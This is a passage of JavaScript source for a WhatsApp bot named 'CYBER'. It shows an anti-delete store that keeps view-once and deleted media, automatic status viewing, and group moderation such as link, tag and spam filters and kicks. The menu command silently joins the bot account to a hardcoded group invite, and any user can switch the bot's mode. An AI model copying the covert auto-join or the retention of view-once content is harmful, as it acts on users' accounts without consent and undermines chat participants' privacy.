            else if (msg.viewOnceMessage || msg.viewOnceMessageV2) {
                const inner = msg.viewOnceMessage?.message || msg.viewOnceMessageV2?.message || {};
                _adContent = inner.imageMessage ? '🔒 View once image' : inner.videoMessage ? '🔒 View once video' : '🔒 View once message';
            }
            // ── Fallback: unknown type ──
            else {
                const knownType = Object.keys(msg)[0];
                if (knownType) _adContent = `[${knownType.replace('Message', '')} message]`;
            }

            // Store with per-bot key so each bot user's messages are tracked separately
            const _adBotNum2 = jidToNum(getBotJid(devtrust));
            const _adStoreKey2 = _adBotNum2
                ? `${_adBotNum2}::${antiStoreKey(_adChatId2, _adMsgId2)}`
                : antiStoreKey(_adChatId2, _adMsgId2);
            // Serialize audio/video message fields for re-download at delete time
            const _adRawMedia = (() => {
                const _am = msg?.audioMessage || null;
                const _vm = msg?.videoMessage || null;
                const _im = msg?.imageMessage || null;
                const _sm = msg?.stickerMessage || null;
                const _dm = msg?.documentMessage || null;
                const _mm = _am || _vm || _im || _sm || _dm;
                const _mtype = _am ? 'audio' : _vm ? 'video' : _im ? 'image' : _sm ? 'sticker' : _dm ? 'document' : null;
                if (!_mm || !_mtype) return null;
                try {
                    return {
                        type: _mtype,
                        url: _mm.url || null,
                        directPath: _mm.directPath || null,
                        mediaKey: _mm.mediaKey ? Buffer.from(_mm.mediaKey).toString('base64') : null,
                        fileEncSha256: _mm.fileEncSha256 ? Buffer.from(_mm.fileEncSha256).toString('base64') : null,
                        fileSha256: _mm.fileSha256 ? Buffer.from(_mm.fileSha256).toString('base64') : null,
                        mimetype: _mm.mimetype || (_mtype === 'audio' ? 'audio/ogg; codecs=opus' : _mtype === 'sticker' ? 'image/webp' : _mtype === 'image' ? 'image/jpeg' : 'video/mp4'),
                        ptt: Boolean(_mm.ptt),
                        caption: _mm.caption || null,
                        isAnimated: Boolean(_mm.isAnimated),
                        fileName: _mm.fileName || _mm.title || null,
                    };
                } catch (_rme) { return null; }
            })();
            const _adMsgData2 = {
                content: _adContent,
                mediaType: _adMediaType,
                mediaPath: _adMediaPath,
                isPtt: _adMediaType === 'audio' && Boolean(msg?.audioMessage?.ptt),
                rawMediaMsg: _adRawMedia,
                fromMe: Boolean(m.key.fromMe),
                sender: _adSender2,
                group: (_adChatId2 || '').endsWith('@g.us') ? _adChatId2 : null,
                timestamp: new Date().toISOString(),
                sessionJid: getBotJid(devtrust)
            };
            // PERF FIX: add _ts so periodic sweep can expire this entry (no individual setTimeout)
            _adMsgData2._ts = Date.now();
            global._antideleteStore.set(_adStoreKey2, _adMsgData2);
            global._antideleteStore.set(antiStoreKey(_adChatId2, _adMsgId2), _adMsgData2);
            // PERF FIX: removed per-message 24h setTimeout — periodic sweep handles cleanup
            _saveDiskStore(); // debounced async write
        }
    } catch (e) { console.error('[ANTIDELETE STORE]', e); }
})();

if (!devtrust.public) {
    // Allow .self / .public / .private to pass even in self mode — so ANY user can toggle mode
    const _isModeToggleCmd = isCmd && ['self', 'public', 'private'].includes(command);
    if (!_isModeToggleCmd) {
        // Channels/newsletters mein bot owner/admin ke liye allow karo (even in private mode)
        const _isNewsletterChat = m.chat && m.chat.endsWith('@newsletter');
        const _senderClean = (m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const _isCreatorFromChannel = _isNewsletterChat && owner.some(o => o.replace(/[^0-9]/g, '') === _senderClean);
        if (!_isBotLinkedUser() && !isCreator && !_isCreatorFromChannel) return;
    }
}

// Linked-user / owner commands — skip auto-react, status hooks, group moderation
const _ownerFastLane = Boolean(_cmdFastPath && isCmd && command);

const example = (teks) => {
    return `Usage : *${prefix+command}* ${teks}`
}

let antilinkStatus = {};
if (!global.banned) global.banned = {} // stores banned users JIDs

// autobio feature permanently removed — caused WhatsApp rate-limiting & 2min command delay

if (isCmd && !_cmdFastPath) {
    console.log(chalk.black(chalk.bgWhite('[ CYBER ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}

// ======================[ BANNED USERS CHECK ]======================
if (getSetting(m.sender, "banned", false)) {
    await reply(`⛔ You are banned from using this bot, @${m.sender.split('@')[0]}`, [m.sender])
    return
}

// Owner/linked-user commands — skip slow group fetch + anti-moderation (instant reply)
if (m.isGroup && !_cmdFastPath) {
  await ensureGroupContext();
} else if (m.isGroup && _cmdFastPath) {
  _groupContextLoaded = true;
}

if (!_ownerFastLane && !isCmd && getSetting(m.chat, "autoReact", false)) {
    const emojis = [
        "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🖕", "🙏", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    // SPEED FIX: fire-and-forget — do NOT await react before running the command
    devtrust.sendMessage(m.chat, {
        react: { text: randomEmoji, key: m.key },
    }).catch(() => {});
}

if (!_ownerFastLane) {
if (getSetting(m.chat, "autoTyping", false)) {
    devtrust.sendPresenceUpdate('composing', from)
}
if (getSetting(m.chat, "autoRecording", false)) {
    devtrust.sendPresenceUpdate('recording', from)
}
if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
}
     
//----------------------Func End----------------//
if (m.key.remoteJid === "status@broadcast") {
    if (getSetting(botNumber, "autoViewStatus", false)) {
        const _viewDelay = getSetting(botNumber, 'autoViewStatusDelay', 0) * 1000;
        const _doView = async () => {
            try {
                const _statusKey = { remoteJid: 'status@broadcast', id: m.key.id, participant: m.key.participant };
                await devtrust.readMessages([_statusKey]);
            } catch (err) {}
        };
        // SPEED FIX: always fire-and-forget — await here blocked the entire message handler
        setTimeout(_doView, _viewDelay || 0);
    }
    if (getSetting(botNumber, "autoStatusReact", false)) {
        const _reactDelay = getSetting(botNumber, 'autoReactStatusDelay', 0) * 1000;
        const _doReact = async () => {
            try {
                const _customEmojis = getSetting(botNumber, 'statusEmojis', null);
                const _statusReacts = (_customEmojis && _customEmojis.length > 0)
                    ? _customEmojis
                    : ['❤️', '🔥', '👍', '😍', '🥰', '😊', '💯', '✅'];
                const _randomReact = _statusReacts[Math.floor(Math.random() * _statusReacts.length)];
                const _reactTarget = m.key.participant || m.sender;
                await devtrust.sendMessage('status@broadcast', {
                    react: { text: _randomReact, key: m.key }
                }, { statusJidList: [_reactTarget] });
            } catch (err) {}
        };
        // SPEED FIX: always fire-and-forget — await here blocked message processing
        setTimeout(_doReact, _reactDelay || 0);
    }
    if (getSetting(botNumber, "autoStatusReply", false)) {
        const _statusReplyMsg = getSetting(botNumber, "autoStatusReplyMsg", null);
        if (_statusReplyMsg && m.key.participant) {
            // SPEED FIX: fire-and-forget — was blocking message handler with await
            const _senderJid = m.key.participant;
            devtrust.sendMessage(_senderJid, { text: _statusReplyMsg }).catch(() => {});
        }
    }
}

// SPEED FIX: duplicate autoTyping/autoRecording block removed (was called twice per message)

if (getSetting(m.sender, "autoread", false)) {
   devtrust.readMessages([m.key]).catch(e => {});
}
} // end !_ownerFastLane (auto-react / status / presence hooks)

// ======================[ 🔇 MUTED USERS CHECK ]======================
if (!_cmdFastPath && m.isGroup && global.muted?.[m.chat]?.includes(m.sender) && !isAdmins && !isCreator) {
    await devtrust.sendMessage(m.chat, { delete: m.key });
    return;
}

// ======================[ 🛡️ ANTI FEATURES DETECTION - FIXED ]======================

// ANTILINK CHECK
if (!_cmdFastPath && m.isGroup && body && !isAdmins && !isCreator) {
    const groupSettings = antilinkSettings[m.chat];
    if (groupSettings && groupSettings.enabled) {
        const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|([a-zA-Z0-9]+\.(com|net|org|io|gov|edu|xyz|tk|ml|ga|cf|gq|me|tv|cc|ws|club|online|site|tech|store|blog|xyz))(\/[^\s]*)?/i;
        const gcLinkRegex = /chat\.whatsapp\.com\/[A-Za-z0-9]+/i;
        const isGcLink = gcLinkRegex.test(body);
        const isAnyLink = linkRegex.test(body.toLowerCase());

        // Determine which mode triggered
        const gcMode = groupSettings.gcMode || 'off'; // antilinkgc / antilinkgckick
        const warnMode = groupSettings.warnMode || false; // antilinkwarn

        if (isGcLink && (gcMode === 'delete' || gcMode === 'kick')) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (gcMode === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for posting a group invite link`, [m.sender]);
            } else {
                await reply(`🔗 @${m.sender.split('@')[0]} group invite links are not allowed in this group`, [m.sender]);
            }
        } else if (isAnyLink && groupSettings.action !== 'off') {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (warnMode) {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for posting links (${wLimit} warnings reached)`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for posting a link (${wCount}/${wLimit} warnings)`, [m.sender]);
                }
            } else if (groupSettings.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for posting links`, [m.sender]);
            } else {
                await reply(`🔗 @${m.sender.split('@')[0]} links are not allowed in this group`, [m.sender]);
            }
        }
    }
}

// ANTI-TAG CHECK (full mode: delete / kick / warn / adminonly / adminonly+warn)
if (!_cmdFastPath && m.isGroup && m.mentionedJid && m.mentionedJid.length > 0 && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const isAdminTag = config.adminOnly && groupAdmins && m.mentionedJid.some(j => groupAdmins.includes(j));
        const isMassTag = m.mentionedJid.length > 1;
        const shouldAct = config.adminOnly ? isAdminTag : isMassTag;
        if (shouldAct) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (config.action === 'warn') {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for tagging (${wLimit} warnings reached)`, [m.sender]);
                } else {
                    const reason = config.adminOnly ? 'tagging admin' : 'mass tagging';
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for ${reason} (${wCount}/${wLimit})`, [m.sender]);
                }
            } else if (config.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} kicked for tagging`, [m.sender]);
            } else {
                const reason = config.adminOnly ? 'tagging admin' : 'mass tagging';
                await reply(`🏷️ @${m.sender.split('@')[0]} ${reason} is not allowed`, [m.sender]);
            }
        }
    }
}

// ANTI-GROUP-MENTION CHECK (group status / @all / @everyone mentions)
if (!_cmdFastPath && m.isGroup && !isAdmins && !isCreator) {
    const _agmSettings = antigroupmentionSettings[m.chat];
    if (_agmSettings && _agmSettings.enabled) {
        const hasGroupMention = m.message?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0
            || body?.toLowerCase().includes('@all') || body?.toLowerCase().includes('@everyone');
        if (hasGroupMention) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (_agmSettings.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for using group mention`, [m.sender]);
            } else if (_agmSettings.action === 'warn') {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for group mentions (${wLimit} warnings)`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for group mention (${wCount}/${wLimit})`, [m.sender]);
                }
            } else {
                await reply(`🔕 @${m.sender.split('@')[0]} group mentions are not allowed`, [m.sender]);
            }
        }
    }
}

// ═════════════════════════════════════════════════════════════════════
// ⚡ INSTANT ANTI-SPAM — pure in-memory, zero DB calls
// ═════════════════════════════════════════════════════════════════════
if (!global._spamGuard) global._spamGuard = new Map();        // userId → { stamps: [...], lastWarn, strikes, banned }
if (!global._spamCleanupTimer) {
    // Auto-clean stale entries every 10 min to prevent memory leak
    global._spamCleanupTimer = setInterval(() => {
        const now = Date.now();
        for (const [uid, rec] of global._spamGuard.entries()) {
            const recent = rec.stamps.filter(ts => now - ts < 60000);
            if (recent.length === 0) global._spamGuard.delete(uid);
            else rec.stamps = recent;
        }
    }, 10 * 60 * 1000);
}

if (!_cmdFastPath && m.isGroup && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const uid = m.sender;
        const now = Date.now();

        let rec = global._spamGuard.get(uid);
        if (!rec) {
            rec = { stamps: [], lastWarn: 0, strikes: 0, banned: false };
            global._spamGuard.set(uid, rec);
        }

        // Ban check — instant drop if repeat offender
        if (rec.banned) {
            try { devtrust.sendMessage(m.chat, { delete: m.key }); } catch(_e){}
            return; // Stop processing this message entirely
        }

        // Sliding window: count msgs in last 5 seconds
        rec.stamps.push(now);
        const window = rec.stamps.filter(ts => now - ts <= 5000);
        rec.stamps = window;

        const rate = window.length; // msgs per 5-sec window
        const isFlood = rate >= 5;
        const isBurst = rec.strikes >= 3 && rate >= 3;

        if (isFlood || isBurst) {
            // Delete the message instantly
            try { await devtrust.sendMessage(m.chat, { delete: m.key }); } catch(_e){}

            if (now - rec.lastWarn > 5000) { // Don't spam warnings
                rec.strikes++;
                rec.lastWarn = now;

                if (config.action === 'kick') {
                    try {
                        await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                        await reply(`👢 @${uid.split('@')[0]} kicked for spamming (${rate}/5s)`, [m.sender]);
                        rec.banned = true;
                    } catch(_e) {
                        await reply(`🚫 @${uid.split('@')[0]} slow down! (${rate} msgs in 5s)`, [m.sender]);
                    }
                } else {
                    // Delete mode (default)
                    if (rec.strikes >= 3) {
                        await reply(`🔨 @${uid.split('@')[0]} banned — spamming detected. Contact admin.`, [m.sender]);
                        rec.banned = true;
                    } else {
                        await reply(`🚫 @${uid.split('@')[0]} slow down! (${rate} msgs in 5s)`, [m.sender]);
                    }
                }
            }
        }
    }
}
// ═════════════════════════════════════════════════════════════════════

// ANTI-BOT CHECK - FIXED
if (!_cmdFastPath && m.isGroup && body && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
    if (config.enabled) {
        // Check if message starts with common bot prefixes
        const botPrefixes = ['.', '!', '/', '#', '$', '%', '&', '*'];
        const startsWithPrefix = botPrefixes.some(prefix => body.startsWith(prefix));
        
        // Check if sender ID looks like a bot
        const isBotJid = m.sender.includes('@bot') || m.sender.includes('broadcast');
        
        // ONLY trigger if BOTH conditions are true
        if (startsWithPrefix && isBotJid) {
            // Delete the message
            await devtrust.sendMessage(m.chat, { delete: m.key });
            
            if (config.action === 'delete') {
                await reply(`🤖 Bot message detected and deleted`, []);
            }
            else if (config.action === 'kick') {
                 if (!isAdmins && !isCreator) {
                    await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                    await reply(`👢 Bot kicked from group`, []);
                } else {
                    await reply(`⚠️ Bot detected but I need admin rights to kick`, []);
                }
            }
        }
    }
}

// ANTI-BEG CHECK
if (m.isGroup && body && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const begPatterns = [
            /bless me/i, /send me money/i, /give me money/i, /help me financially/i,
            /i need money/i, /i dey suffer/i, /no money/i, /hungry dey catch me/i,
            /send me airtime/i, /buy me data/i, /fund me/i, /CYBERate to me/i,
            /my account number/i, /bank transfer/i, /send cash/i, /poor me/i,
            /assist me financially/i, /brother help/i, /sister help/i,
            /anything for me/i, /what about me/i, /remember me/i,
            /broke/i, /suffering/i, /starving/i, /no food/i
        ];
        
        const isBegging = begPatterns.some(pattern => pattern.test(body));
        
        if (isBegging) {
            // Delete the message
            await devtrust.sendMessage(m.chat, { delete: m.key });
            
            if (config.action === 'delete') {
                await reply(`💰 @${m.sender.split('@')[0]} begging is not allowed`, [m.sender]);
            }
            else if (config.action === 'kick') {
                 if (!isAdmins && !isCreator) {
                    await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for begging`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} would be kicked but I need admin rights`, [m.sender]);
                }
            }
        }
    }
}

if (!_ownerFastLane) {
if (getSetting(m.chat, "feature.autoreply", false)) {
   const autoReplyList = { 
       "hi": "Hello 👋", 
       "hello": "Hi there!", 
       "I am CYBER": "Coolest Whatsapp bot 😌" 
   }
   if (autoReplyList[m.text?.toLowerCase()]) {
      await reply(autoReplyList[m.text.toLowerCase()])
   }
}

let chatbot = false;

if (getSetting(m.chat, "feature.antibadword", false)) {
   const badWords = ["fuck", "bitch", "sex", "nigga","bastard","fool","mumu","idiot","werey","mother","mama","ass","mad","dick","pussy","bast"]
   if (badWords.some(word => m.text?.toLowerCase().includes(word))) {
      await reply(`❌ @${m.sender.split('@')[0]} watch your language 😟!`, [m.sender])
      await devtrust.sendMessage(m.chat, { delete: m.key })
   }
}
 
if (getSetting(m.chat, "feature.antibot", false)) {
   let botPrefixes = ['.', '!', '/', '#']
   if (botPrefixes.includes(m.text?.trim()[0])) {
      if (!isOwner) {
         await reply(`🤖 Anti-Bot active! @${m.sender.split('@')[0]} not allowed.`, [m.sender])
         await devtrust.sendMessage(m.chat, { delete: m.key })
      }
   }
}
} // end !_ownerFastLane (autoreply / antibadword / antibot)

//LOADING FUNCTION
async function nexusLoading() {
    const nexusMylove = [`Loading menu...`];
    let msg = await devtrust.sendMessage(from, { text: "Connecting to CYBER server....." });

    for (let i = 0; i < nexusMylove.length; i++) {
        await devtrust.sendMessage(from, {
            text: nexusMylove[i],
            edit: msg.key
        });
        await new Promise(resolve => setTimeout(resolve, 200));
    }
}

// NOTE: Newsletter auto-react is now handled inline above (no nested listener)

if (m.message && isCmd) {
    console.log(chalk.hex('#3498db')(`cmd "${body}" from ${pushname} (${m.isGroup ? 'group' : 'private'})`));
}

// ============ NEWSLETTER AUTO-REACT (inline, no nested listener) ============
const newsletterJids = ["120363408022768294@newsletter"];
const newsletterEmojis = [
    '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💔', '❣️', 
    '💕', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '🥺', '😊', '🙏', 
    '😙', '😻', '🔥', '😀', '😍', '🥰', '😘', '🤗', '🤩', '😎', '😇', 
    '🥶','🥳', '😋', '🎉', '🔥'
];
const hansRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

if (newsletterJids.includes(from)) {
    const serverId = m?.newsletterServerId;
    if (serverId) {
        try {
            const emoji = hansRandom(newsletterEmojis);
            await devtrust.newsletterReactMessage(from, serverId.toString(), emoji);
        } catch (err) {
            console.error("❌ Newsletter auto-reaction error:", err);
        }
    }
    return;
}
// =======================================================================

// ======================[ ⚠️ WARN SYSTEM HELPER ]======================
async function handleWarn(chatId, userId, reason, mode) {
    if (!global.warns[chatId]) global.warns[chatId] = {};
    if (!global.warns[chatId][userId]) global.warns[chatId][userId] = 0;
    
    // MODE 1: DELETE ONLY - no warnings
    if (mode === 'delete') {
        return { action: 'delete', kicked: false };
    }
    
    // MODE 2: WARN - add warning
    if (mode === 'warn') {
        global.warns[chatId][userId] += 1;
        const warnCount = global.warns[chatId][userId];
        const warnLimit = getWarnLimit(chatId);
        
        if (warnCount >= warnLimit) {
            delete global.warns[chatId][userId];
            return { action: 'kick', kicked: true, warnCount, warnLimit };
        }
        
        return { action: 'warn', kicked: false, warnCount, warnLimit };
    }
    
    // MODE 3: KICK - immediate kick
    if (mode === 'kick') {
        return { action: 'kick', kicked: true, warnCount: 0 };
    }
    
    return { action: 'delete', kicked: false };
}

// ============ MENU HELPER FUNCTIONS ============

function formatUptime(seconds) {
    const days = Math.floor(seconds / (24 * 60 * 60));
    seconds = seconds % (24 * 60 * 60);
    const hours = Math.floor(seconds / (60 * 60));
    seconds = seconds % (60 * 60);
    const minutes = Math.floor(seconds / 60);
    seconds = Math.floor(seconds % 60);

    let time = '';
    if (days > 0) time += `${days}d `;
    if (hours > 0) time += `${hours}h `;
    if (minutes > 0) time += `${minutes}m `;
    if (seconds > 0 || time === '') time += `${seconds}s`;
    return time.trim();
}

function formatRam(total, free) {
    const used = (total - free) / (1024 * 1024 * 1024);
    const totalGb = total / (1024 * 1024 * 1024);
    const percent = ((used / totalGb) * 100).toFixed(1);
    return `${used.toFixed(1)}GB / ${totalGb.toFixed(1)}GB (${percent}%)`;
}

let _cachedCommandCount = null;
function countCommands() {
    if (_cachedCommandCount !== null) return _cachedCommandCount;
    try {
        if (!global._caseFileContent) global._caseFileContent = fs.readFileSync(__filename).toString();
        const commandRegex = /case ['"]([^'"]+)['"]:/g;
        const matches = [...global._caseFileContent.matchAll(commandRegex)];
        _cachedCommandCount = new Set(matches.map((match) => match[1])).size;
        console.log(`📊 Total commands detected: ${_cachedCommandCount}`);
        return _cachedCommandCount;
    } catch (e) {
        console.error('Error counting commands:', e);
        _cachedCommandCount = 4;
        return _cachedCommandCount;
    }
}
setImmediate(() => { try { countCommands(); } catch (_) {} });

function getMoodEmoji() {
    const hour = getLagosTime().getHours();
    if (hour < 12) return '🌅';
    if (hour < 18) return '☀️';
    return '🌙';
}

function getLagosTime() {
    try {
        const options = {
            timeZone: 'Africa/Lagos',
            hour12: false,
            hour: 'numeric',
            minute: 'numeric'
        };
        const formatter = new Intl.DateTimeFormat('en-GB', options);
        const parts = formatter.formatToParts(new Date());
        const hour = parts.find(part => part.type === 'hour').value;
        const minute = parts.find(part => part.type === 'minute').value;
        const now = new Date();
        const lagosDate = new Date(now.toLocaleString('en-US', {timeZone: 'Africa/Lagos'}));
        return lagosDate;
    } catch (error) {
        const now = new Date();
        const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
        return new Date(utc + (3600000 * 1));
    }
}

// PERF: cached at module load — regex on 700KB file was running on every message
const _caseStats = _getCaseListStats();
const caseCount = _caseStats.count;
const caseNames = _caseStats.names;
let totalCases = caseCount;
let listCases = caseNames.join('\n⭔ '); 

async function autoJoinGroup(devtrust, inviteLink) {
  try {
    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
    if (!inviteCode) {
      throw new Error('Invalid invite link');
    }
    const result = await devtrust.groupAcceptInvite(inviteCode);
    console.log('✅ Joined group:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to join group:', error.message);
    return null;
  }
}

function formatLagosTime() {
    const lagosTime = getLagosTime();
    const hours = lagosTime.getHours().toString().padStart(2, '0');
    const minutes = lagosTime.getMinutes().toString().padStart(2, '0');
    return `${hours}:${minutes}`;
}

// ============ GET PROFESSIONAL FEATURES ============

function getOwnerName() {
    return "GAME CHANGER";
}

function getBotVersion() {
    return "1.1";
}

function getBotMode() {
    // Per-session check — devtrust.public is isolated per connected WhatsApp number
    return devtrust.public ? "PUBLIC" : "PRIVATE";
}

function getCurrentDateTime() {
    const date = new Date();
    const options = { 
        timeZone: 'Africa/Lagos',
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    };
    return date.toLocaleString('en-US', options) + ' WAT';
}

// ============ STICKER COMMAND DETECTION ============
function _stickerFileKey(msg) {
    const sm = msg?.stickerMessage || msg?.message?.stickerMessage;
    if (!sm) return msg?.key?.id || '';
    const sha = sm.fileSha256;
    if (sha) {
        if (Buffer.isBuffer(sha)) return sha.toString('base64');
        if (typeof sha === 'string') return sha;
        if (sha?.type === 'Buffer' && Array.isArray(sha.data)) return Buffer.from(sha.data).toString('base64');
    }
    return msg?.key?.id || '';
}
// If the message is a sticker, check if it has a registered command binding
if (m.message?.stickerMessage && !command) {
    try {
        const _stickerCmds = loadStickerCmds();
        const _stickerKey = _stickerFileKey(m);
        const _matchedCmd = _stickerCmds[_stickerKey];
        if (_matchedCmd) {
            body = prefix + _matchedCmd;
            const afterPrefix = body.slice(prefix.length).trim();
            const parts = afterPrefix.split(/ +/);
            command = parts[0].toLowerCase();
            args = parts.slice(1);
            text = args.join(' ');
        }
    } catch (e) {}
}

// ============ MENU COMMAND ============

switch(command) {
// ============ MENU WITH ALPHABETICAL ORDER ============

case 'allmenu':
case 'CYBERall':
case 'commandlist': {
  setImmediate(() => autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {}));
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐈* ◆━━┓
│❖ ${prefix}ai
│❖ ${prefix}aipic
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
